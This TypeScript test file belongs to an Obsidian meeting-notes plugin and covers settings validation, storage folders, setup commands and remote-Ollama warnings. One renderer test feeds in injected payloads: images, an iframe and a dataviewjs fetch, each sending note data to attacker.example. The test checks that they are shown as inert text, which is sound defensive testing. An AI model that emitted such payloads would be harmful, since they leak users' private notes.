import assert from 'node:assert/strict';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { createRequire, registerHooks } from 'node:module';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import { LOCAL_KEY } from '../src/host/localSettings.ts';
import { DEFAULT_SETTINGS } from '../src/settings.ts';
import type { HamsterSettings, LocalSettings, SessionDeps, Stats, UiHost } from '../src/types.ts';

/* The plugin's own wiring: what main.ts hands to the session, to the settings
   tab and to the sidebar. `obsidian` is a stub, the sidebar's React tree is
   left out (Node does not read .tsx), and the session is a recorder: what is
   under test is which values and calls reach it. Files that live outside the
   vault go to a temporary directory. */

interface FakeSession {
  deps: SessionDeps;
  calls: Array<[string, ...unknown[]]>;
}
interface Recorded {
  notices: Array<{ message: string; ms: number | undefined }>;
  rendered: string[];
  sessions: FakeSession[];
  views: Array<{ type: string; factory: (leaf: object) => { getProps(): { host: UiHost } } }>;
  tabs: object[];
}
const record: Recorded = { notices: [], rendered: [], sessions: [], views: [], tabs: [] };
(globalThis as { __hamsterMain?: Recorded }).__hamsterMain = record;

// Moment is a dependency of the `obsidian` package, not of this repository.
const obsidianPackage = createRequire(import.meta.url).resolve('obsidian/package.json');

const OBSIDIAN_STUB = `
import { createRequire } from 'node:module';
import { StateField } from '@codemirror/state';
const record = globalThis.__hamsterMain;
export const moment = createRequire(${JSON.stringify(obsidianPackage)})('moment');
export const editorInfoField = StateField.define({ create: () => null, update: (value) => value });
export class Notice {
  constructor(message, ms) { record.notices.push({ message, ms }); }
}
export class MarkdownView {}
export class Modal { constructor(app) { this.app = app; } }
export class ButtonComponent {}
export class Setting {}
export class TFile {}
export class Component { load() {} unload() {} }
export const MarkdownRenderer = {
  async render(app, markdown) { record.rendered.push(markdown); },
};
export class PluginSettingTab {
  constructor(app) { this.app = app; }
  hide() {}
}
export class FileSystemAdapter {}
// What a plugin gets from Obsidian: its data.json, its manifest, and places to register things.
export class Plugin {
  constructor(app, data, manifest) { this.app = app; this.data = data; this.manifest = manifest; }
  async loadData() { return this.data === null ? null : structuredClone(this.data); }
  async saveData(data) { this.data = structuredClone(data); }
  registerView(type, factory) { record.views.push({ type, factory }); }
  addSettingTab(tab) { record.tabs.push(tab); }
  registerEditorExtension() {}
  addRibbonIcon() {}
  addCommand() {}
  registerEvent() {}
  registerDomEvent() {}
  registerInterval() {}
}
export function normalizePath(path) {
  const clean = path.replace(/[\\\\/]+/g, '/').replace(/^\\/+|\\/+$/g, '');
  return clean === '' ? '/' : clean;
}
`;

const SESSION_STUB = `
const record = globalThis.__hamsterMain;
export function createSession(deps) {
  const calls = [];
  const note = (name) => (...args) => { calls.push([name, ...args]); };
  const session = {
    deps,
    calls,
    store: { getState: () => ({ meeting: null, recording: 'idle' }), subscribe: () => () => undefined },
    controller: {},
    init: async () => { calls.push(['init']); },
    handleDailyUpdate: note('handleDailyUpdate'),
    handleDailyAvailability: note('handleDailyAvailability'),
    handleVaultChange: note('handleVaultChange'),
    handleSettingsChange: note('handleSettingsChange'),
    flushAll: async () => undefined,
    dispose: async () => undefined,
  };
  record.sessions.push(session);
  return session;
}
`;

const STUBS: { [url: string]: string } = {
  'hamster-test:obsidian': OBSIDIAN_STUB,
  'hamster-test:session': SESSION_STUB,
  'hamster-test:view': 'export class HamsterView { constructor(leaf, getProps) { this.getProps = getProps; } }',
  'hamster-test:mount': 'export function syncAllThemes() {}',
};

registerHooks({
  resolve(specifier, context, nextResolve) {
    if (specifier === 'obsidian') return { url: 'hamster-test:obsidian', shortCircuit: true };
    if (specifier.endsWith('/session/meetingSession.ts')) return { url: 'hamster-test:session', shortCircuit: true };
    if (specifier.endsWith('/ui/SidebarView.ts')) return { url: 'hamster-test:view', shortCircuit: true };
    if (specifier.endsWith('/ui/mount.tsx')) return { url: 'hamster-test:mount', shortCircuit: true };
    // The stubs have no place on disk: what they import is looked up from here.
    if (context.parentURL !== undefined && context.parentURL in STUBS) {
      return nextResolve(specifier, { ...context, parentURL: import.meta.url });
    }
    return nextResolve(specifier, context);
  },
  load(url, context, nextLoad) {
    if (url in STUBS) return { format: 'module', source: STUBS[url], shortCircuit: true };
    // micCapture.ts takes its worklet as text through Vite's `?raw`.
    if (url.endsWith('?raw')) {
      const text = readFileSync(fileURLToPath(url.slice(0, -'?raw'.length)), 'utf8');
      return { format: 'module', source: `export default ${JSON.stringify(text)};`, shortCircuit: true };
    }
    return nextLoad(url, context);
  },
});

/* main.ts takes its timers from `window`. Nothing here lets one run: the
   only one started at load is the once-a-minute look at the date. */
(globalThis as { window?: unknown }).window = {
  setTimeout: (): number => 0,
  clearTimeout: (): void => undefined,
  setInterval: (): number => 0,
  clearInterval: (): void => undefined,
};

const { default: MagicalHamsterPlugin } = await import('../src/main.ts');

const scratch = mkdtempSync(join(tmpdir(), 'hamster-main-'));
after(() => rmSync(scratch, { recursive: true, force: true }));
let cases = 0;
function scratchDir(): string {
  cases += 1;
  return join(scratch, `case-${cases}`);
}

interface TabDeps {
  settings(): HamsterSettings;
  updateSettings(patch: Partial<HamsterSettings>): Promise<void>;
  local(): LocalSettings;
  setLocal(patch: Partial<LocalSettings>): void;
  runtimeDir(): string;
  speechSetupCommand: string;
  pluginVersion: string | null;
}

/** What manifest.json gives Obsidian, as far as main.ts reads it. */
interface Manifest {
  id: string;
  version?: string;
}
const MANIFEST: Manifest = { id: 'magical-hamster', version: '0.1.5' };

/**
 * The plugin, loaded over the given data.json and device settings, as far as
 * Obsidian's `onload`. `storage` is the device's own storage, for a second
 * start on the same device.
 */
async function load(
  data: Partial<HamsterSettings> | null = null,
  local: Partial<LocalSettings> = {},
  storage = new Map<string, unknown>(),
  /** Paths the vault's adapter says exist: Obsidian's config files, and the plugin's own data.json. */
  onDisk: string[] = [],
  manifest: Manifest | null = MANIFEST,
) {
  record.notices.length = 0;
  record.rendered.length = 0;
  storage.set(LOCAL_KEY, local);
  const ready: Array<() => void> = [];
  const listen = (): object => ({});
  const app = {
    vault: {
      configDir: '.obsidian',
      adapter: {
        exists: async (path: string): Promise<boolean> => onDisk.includes(path),
        read: async (): Promise<string> => '',
      },
      on: listen,
      getName: (): string => 'Test Vault',
      getFileByPath: (): null => null,
      getAbstractFileByPath: (): null => null,
      getMarkdownFiles: (): object[] => [],
      getAllFolders: (): object[] => [],
    },
    workspace: {
      on: listen,
      layoutReady: true,
      onLayoutReady: (callback: () => void): void => {
        ready.push(callback);
      },
      getLeavesOfType: (): object[] => [],
      getMostRecentLeaf: (): null => null,
    },
    metadataCache: { on: listen, offref: (): void => undefined, getFileCache: (): null => null },
    fileManager: { getNewFileParent: (): { path: string } => ({ path: '/' }) },
    loadLocalStorage: (key: string): unknown => storage.get(key) ?? null,
    saveLocalStorage: (key: string, value: unknown): void => {
      storage.set(key, value);
    },
  };
  const Plugin = MagicalHamsterPlugin as unknown as new (app: object, data: object | null, manifest: Manifest | null) => {
    data: Partial<HamsterSettings> | null;
    settings: HamsterSettings;
    onload(): Promise<void>;
    onExternalSettingsChange(): Promise<void>;
  };
  const plugin = new Plugin(app, data, manifest);
  await plugin.onload();
  const session = record.sessions.at(-1);
  const view = record.views.at(-1);
  const tab = record.tabs.at(-1) as { deps: TabDeps } | undefined;
  assert.ok(session && view && tab, 'the plugin did not finish loading');
  return {
    plugin,
    session,
    tab: tab.deps,
    storage,
    host: view.factory({}).getProps().host,
    /** What Obsidian does once the workspace is laid out. */
    layoutReady: (): void => {
      for (const callback of ready) callback();
    },
    /** Another device's settings arriving in data.json. */
    sync: async (patch: Partial<HamsterSettings>): Promise<void> => {
      plugin.data = { ...plugin.settings, ...patch };
      await plugin.onExternalSettingsChange();
    },
  };
}

const settle = (): Promise<void> => new Promise((resolve) => setImmediate(resolve));
/* Read through a function: an assertion that the list is empty would otherwise narrow it for the rest of a test. */
const notices = (): Recorded['notices'] => record.notices;

describe('main: the settings file', () => {
  const unreadable = (): Recorded['notices'] => notices().filter((n) => /settings file/.test(n.message));

  it('says once, and keeps saying, when data.json is there but could not be read', async () => {
    // Obsidian answers null for a file it cannot parse, as for none at all.
    await load(null, {}, new Map(), ['.obsidian/plugins/magical-hamster/data.json']);
    assert.equal(unreadable().length, 1);
    assert.match(unreadable()[0].message, /^Magical Hamster: The settings file .*could not be read/);
    assert.equal(unreadable()[0].ms, 0, 'stays up until dismissed');
  });

  it('says nothing on a first start, when there is no data.json yet', async () => {
    await load(null);
    assert.equal(unreadable().length, 0);
  });

  it('checks every field: a synced data.json with a wrong type leaves the default in place', async () => {
    const t = await load({ numCtx: '16384' as unknown as number, micLabel: null as unknown as string });
    assert.equal(t.plugin.settings.numCtx, DEFAULT_SETTINGS.numCtx);
    assert.equal(t.plugin.settings.micLabel, DEFAULT_SETTINGS.micLabel);
    await t.sync({ indexedFolders: 'x' as unknown as string[] });
    assert.deepEqual(t.plugin.settings.indexedFolders, []);
  });
});

describe('main: the runtime folder of the stats and the index', () => {
  const stats: Stats = {
    input: 797,
    output: 14,
    cached: 0,
    weekly: { '2026-10-05': { input: 797, output: 14 } },
    meetings: 0,
    assists: 1,
  };

  it('stays the folder Obsidian started with, whatever is typed into the setting afterwards', async () => {
    const started = join(scratchDir(), 'runtime');
    const parent = scratchDir();
    mkdirSync(parent, { recursive: true });
    const typed = join(parent, 'elsewhere');
    const t = await load(null, { runtimeDir: started });

    // The settings tab stores the field at every keystroke, and each prefix of a path is a folder too.
    for (let length = parent.length + 2; length <= typed.length; length++) {
      t.tab.setLocal({ runtimeDir: typed.slice(0, length) });
      await t.session.deps.statsIO.save(stats);
      await t.session.deps.vaultIndexIO?.save('{}', new Uint8Array([1, 2, 3]));
    }

    assert.deepEqual(JSON.parse(readFileSync(join(started, 'stats.json'), 'utf8')), stats);
    assert.deepEqual(readdirSync(started).sort(), ['index', 'stats.json']);
    assert.deepEqual(readdirSync(parent), [], 'no folder for what was typed, nor for any of its beginnings');
    assert.equal(await t.session.deps.vaultIndexIO?.load().then((found) => found?.index), '{}');

    // The speech runtime is only read: it follows the setting at once, as the settings tab shows it.
    assert.equal(t.tab.runtimeDir(), typed);
    assert.equal(t.session.deps.local().runtimeDir, typed);
  });

  it('does not write this session\'s figures over the stats of a folder named after the start', async () => {
    const moved = scratchDir();
    const t = await load(null, { runtimeDir: join(scratchDir(), 'empty') });
    assert.equal(await t.session.deps.statsIO.load(), null);

    t.tab.setLocal({ runtimeDir: moved });
    await t.session.deps.statsIO.save(stats);

    assert.equal(existsSync(join(moved, 'stats.json')), false);
  });

  it('sweeps the temporary file of a save that was cut short before it reads the index', async () => {
    const started = join(scratchDir(), 'runtime');
    const t = await load(null, { runtimeDir: started });
    const io = t.session.deps.vaultIndexIO;
    assert.ok(io, 'the plugin gives the session an index');
    await io.save('{"v":2}', new Uint8Array([1, 2, 3]));
    const [dir] = readdirSync(join(started, 'index'));
    // What writeFileAtomic leaves when Obsidian dies between its write and its rename.
    const leftover = join(started, 'index', dir, 'index.json.x.tmp');
    writeFileSync(leftover, '{');

    assert.equal(await io.load().then((found) => found?.index), '{"v":2}');
    assert.equal(existsSync(leftover), false);
    assert.deepEqual(readdirSync(join(started, 'index', dir)).sort(), ['index.json', 'vectors.bin']);
    // Before any save there is no folder to sweep and nothing to read: neither is an error.
    const fresh = await load(null, { runtimeDir: join(scratchDir(), 'fresh') });
    assert.equal(await fresh.session.deps.vaultIndexIO?.load(), null);
  });
});

describe('main: the paths of this device, as the speech source gets them', () => {
  it('expands a ~ in the Node path, which spawned as typed would be a relative path that exists nowhere', async () => {
    const t = await load(null, { nodePath: '~/bin/node' });
    assert.equal(t.session.deps.local().nodePath, join(homedir(), 'bin', 'node'));
    assert.equal(t.tab.local().nodePath, '~/bin/node', 'the settings tab shows what was typed');

    t.tab.setLocal({ nodePath: '' });
    assert.equal(t.session.deps.local().nodePath, '', 'empty still means the Node the setup recorded');
    t.tab.setLocal({ nodePath: '/opt/homebrew/bin/node' });
    assert.equal(t.session.deps.local().nodePath, '/opt/homebrew/bin/node');
  });

  it('takes a relative runtime folder from the home directory, not from where Obsidian was started', async () => {
    const t = await load(null, { runtimeDir: 'hamster-nowhere' });
    assert.equal(t.session.deps.local().runtimeDir, join(homedir(), 'hamster-nowhere'));
    assert.equal(t.tab.runtimeDir(), join(homedir(), 'hamster-nowhere'));
    assert.equal(t.tab.local().runtimeDir, 'hamster-nowhere');
    assert.equal(existsSync(join(homedir(), 'hamster-nowhere')), false, 'resolved, not created');
  });
});

describe('main: the Markdown renderer handed to the sidebar', () => {
  /* The DOM calls a renderer can make, recorded: which elements it asked for and which text it
     put in them. There is no HTML parser behind it, as there is none in the plugin's renderer. */
  function page() {
    const made: string[] = [];
    const texts: string[] = [];
    interface Node {
      parentNode: Node | null;
      children: Node[];
      className: string;
      dataset: Record<string, string>;
      ownerDocument: typeof doc;
      appendChild(child: Node): Node;
      removeChild(child: Node): Node;
      replaceChildren(...next: Node[]): void;
      setAttribute(): void;
      createEl(tag: string, o?: { cls?: string; text?: string }): Node;
      createDiv(o?: { cls?: string; text?: string }): Node;
    }
    const node = (): Node => {
      const self: Node = {
        parentNode: null,
        children: [],
        className: '',
        dataset: {},
        ownerDocument: doc,
        appendChild(child) {
          child.parentNode = self;
          self.children.push(child);
          return child;
        },
        removeChild(child) {
          self.children = self.children.filter((other) => other !== child);
          child.parentNode = null;
          return child;
        },
        replaceChildren(...next) {
          self.children = [];
          for (const child of next) self.appendChild(child);
        },
        setAttribute: () => undefined,
        /* Obsidian's helpers: made through the same document, then appended. */
        createEl(tag, o = {}) {
          const child = doc.createElement(tag);
          child.className = o.cls ?? '';
          if (o.text) child.appendChild(doc.createTextNode(o.text));
          return self.appendChild(child);
        },
        createDiv: (o) => self.createEl('div', o),
      };
      return self;
    };
    const doc = {
      createElement(tag: string): Node {
        made.push(tag);
        return node();
      },
      createTextNode(text: string): Node {
        texts.push(text);
        return node();
      },
    };
    const el = node();
    return { el, made, texts };
  }
  /* What the plugin's renderer builds its output from. None of them loads anything or runs anything. */
  const INERT = new Set(['div', 'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'strong', 'em', 'code', 'pre']);

  it('is the plugin\'s own: what a model wrote never reaches Obsidian\'s renderer', async () => {
    const t = await load();
    const answer = [
      'Two posts are **frozen** until Q1.',
      '',
      '![ ](https://attacker.example/p.png?d=2%20postes%20geles)',
      '<img src="https://attacker.example/q.png?d=budget">',
      '<iframe src="https://attacker.example/frame"></iframe>',
      '',
      '```dataviewjs',
      'fetch("https://attacker.example/?d=" + dv.current().file.name)',
      '```',
    ].join('\n');
    const { el, made, texts } = page();

    const cleanup = t.host.renderMarkdown(answer, el as unknown as HTMLElement);
    await settle();

    // Obsidian's renderer hands its output to every plugin's post-processor and fetches what it draws.
    assert.deepEqual(record.rendered, [], 'MarkdownRenderer.render was called');
    assert.deepEqual(
      made.filter((tag) => !INERT.has(tag)),
      [],
    );
    assert.ok(made.includes('strong') && made.includes('pre'), 'the text is still formatted');
    const shown = texts.join('\n');
    assert.match(shown, /Two posts are /);
    assert.match(shown, /<img src="https:\/\/attacker\.example\/q\.png\?d=budget">/, 'a tag is shown as the text it is');
    assert.match(shown, /dv\.current\(\)/, 'and so is code');

    assert.equal(el.children.length, 1);
    cleanup();
    assert.equal(el.children.length, 0, 'the cleanup takes the output out again');
  });
});

describe('main: the speech setup command handed to the sidebar and the settings tab', () => {
  it('names the release this plugin is, so that the worker installed is the one it was built with', async () => {
    const t = await load();
    const command = 'curl -fsSL https://github.com/baconbro/magical-hamster/releases/download/0.1.5/setup-speech.mjs -o setup-speech.mjs && node setup-speech.mjs';
    assert.equal(t.host.speechSetupCommand, command);
    assert.equal(t.tab.speechSetupCommand, command, 'the settings tab shows and copies the same one');
    assert.equal(t.tab.pluginVersion, '0.1.5');
  });

  it('falls back to the latest release when the manifest gives no version, or not a release’s', async () => {
    const latest = /\/releases\/latest\/download\/setup-speech\.mjs /;
    const none = await load(null, {}, new Map(), [], { id: 'magical-hamster' });
    assert.match(none.host.speechSetupCommand, latest);
    assert.equal(none.tab.pluginVersion, null);

    const dev = await load(null, {}, new Map(), [], { id: 'magical-hamster', version: '0.2.0-dev' });
    assert.match(dev.host.speechSetupCommand, latest);
    assert.equal(dev.tab.pluginVersion, '0.2.0-dev', 'still the version the runtime is compared with');

    const absent = await load(null, {}, new Map(), [], null);
    assert.match(absent.host.speechSetupCommand, latest);
  });
});

describe('main: an Ollama address that is not this computer', () => {
  it('is announced when it arrives from another device, and stays on screen until read', async () => {
    const t = await load();
    t.layoutReady();
    assert.deepEqual(notices(), [], 'nothing to say about localhost');

    await t.sync({ ollamaUrl: 'http://192.168.1.50:11434' });

    assert.equal(notices().length, 1);
    const [notice] = notices();
    assert.equal(notice.ms, 0, 'until it is clicked away');
    assert.match(notice.message, /^Magical Hamster: The Ollama address changed with the settings synced from another device\./);
    assert.match(notice.message, /192\.168\.1\.50 is not this computer\./);
    assert.match(notice.message, /Transcripts, notes, passages from the vault and questions are sent to it, without encryption\./);
    assert.equal(t.session.deps.settings().ollamaUrl, 'http://192.168.1.50:11434', 'the setting itself is applied as before');
  });

  it('is not announced again when something else is synced, nor when the address comes home', async () => {
    const t = await load({ ollamaUrl: 'https://ollama.example.com' });
    await t.sync({ micLabel: 'Mic (room)' });
    await t.sync({ ollamaUrl: 'http://127.0.0.1:11434' });
    await t.sync({ ollamaUrl: 'http://localhost:11434' });
    assert.deepEqual(notices(), []);
  });

  it('is said at every start', async () => {
    const t = await load({ ollamaUrl: 'https://ollama.example.com' });
    assert.deepEqual(notices(), [], 'not before the workspace is there');
    t.layoutReady();
    assert.equal(notices().length, 1);
    assert.equal(
      notices()[0].message,
      'Magical Hamster: ollama.example.com is not this computer. Transcripts, notes, passages from the vault and questions are sent to it. The Ollama address is in the settings.',
    );
    assert.ok((notices()[0].ms ?? 0) >= 10_000, 'long enough to be read');
  });
});

describe('main: a soft-marker pattern that did not come through the settings tab', () => {
  const SLOW = '^(Sync|Standup) (\\w+ ?)+$';

  it('is not handed to the session when it would freeze typing', async () => {
    const t = await load({ softMarkerPattern: SLOW });

    const used = t.session.deps.settings();
    assert.equal(used.softMarkerPattern, '$^', 'a pattern that matches no line');
    assert.equal(used.companionPrefix, DEFAULT_SETTINGS.companionPrefix, 'the other settings are untouched');
    assert.equal(t.tab.settings().softMarkerPattern, SLOW, 'the settings tab still shows what is stored');
    assert.equal(t.plugin.settings.softMarkerPattern, SLOW);

    assert.equal(notices().length, 1);
    assert.match(notices()[0].message, /pattern for meeting lines without a heading is empty, invalid or too slow, and is not used/);

    // Asked at every keystroke: decided once.
    const started = performance.now();
    for (let i = 0; i < 1000; i++) assert.equal(t.session.deps.settings(), used);
    assert.ok(performance.now() - started < 200);
    assert.equal(notices().length, 1);
  });

  it('is not saved over the stored one when another setting is saved', async () => {
    const t = await load({ softMarkerPattern: SLOW });
    await t.tab.updateSettings({ micLabel: 'Mic (room)' });
    assert.equal(t.plugin.data?.softMarkerPattern, SLOW);
    assert.equal(t.session.deps.settings().softMarkerPattern, '$^');
    assert.equal(t.session.deps.settings().micLabel, 'Mic (room)');
    assert.equal(notices().length, 1, 'said once for the same pattern');
  });

  it('is caught when it arrives from another device, and an empty one as well', async () => {
    const t = await load();
    assert.equal(t.session.deps.settings().softMarkerPattern, DEFAULT_SETTINGS.softMarkerPattern);

    await t.sync({ softMarkerPattern: '^Prep (\\w+)+$' });
    assert.equal(t.session.deps.settings().softMarkerPattern, '$^');
    assert.equal(notices().length, 1);

    // An empty pattern would make every short line a meeting.
    await t.sync({ softMarkerPattern: '' });
    assert.equal(t.session.deps.settings().softMarkerPattern, '$^');
    assert.equal(notices().length, 2);

    // A hand-edited data.json can hold something that is not text at all:
    // parseSettings puts the shipped pattern in its place, which needs no check.
    await t.sync({ softMarkerPattern: 7 as unknown as string });
    assert.equal(t.session.deps.settings().softMarkerPattern, DEFAULT_SETTINGS.softMarkerPattern);
    assert.equal(t.storage.has('magical-hamster:soft-marker-checked-2'), false);
  });

  it('is checked once on a device, not at every start', async () => {
    const CHECKED = 'magical-hamster:soft-marker-checked-2';
    const pattern = '^(Sync|Standup|Comité)\\b';
    const first = await load({ softMarkerPattern: pattern });
    assert.equal(first.session.deps.settings().softMarkerPattern, pattern);
    assert.equal(first.storage.get(CHECKED), pattern, 'remembered as usable');

    // A refused pattern is not remembered: the stored one stays the last usable one.
    await first.sync({ softMarkerPattern: SLOW });
    assert.equal(first.session.deps.settings().softMarkerPattern, '$^');
    assert.equal(first.storage.get(CHECKED), pattern);

    /* The next start takes the remembered pattern without probing it again.
       Seen here through a pattern no check would let through. */
    const again = await load({ softMarkerPattern: SLOW }, {}, new Map([[CHECKED, SLOW]]));
    assert.equal(again.session.deps.settings().softMarkerPattern, SLOW);
    assert.deepEqual(notices(), []);

    // The default pattern is neither checked nor remembered.
    const plain = await load();
    assert.equal(plain.session.deps.settings().softMarkerPattern, DEFAULT_SETTINGS.softMarkerPattern);
    assert.equal(plain.storage.has(CHECKED), false);
  });

  it('leaves a pattern the settings tab would accept exactly as it is', async () => {
    const pattern = '^(Sync|Standup|Comité)\\b';
    const t = await load({ softMarkerPattern: pattern });
    assert.equal(t.session.deps.settings().softMarkerPattern, pattern);
    assert.equal(t.session.deps.settings(), t.plugin.settings, 'the very same settings object');
    assert.deepEqual(notices(), []);
  });
});
